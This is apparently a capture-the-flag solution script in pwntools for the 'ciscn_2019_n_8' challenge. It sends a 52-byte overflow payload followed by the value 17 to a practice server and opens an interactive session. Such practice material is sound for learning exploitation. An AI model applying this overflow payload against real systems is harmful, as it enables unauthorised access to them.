from pwn import *

p = process("./ciscn_2019_n_8")
p = remote("node4.buuoj.cn", 28945)

payload = b"A" * 52 + p32(17)

p.sendline(payload)
p.interactive()
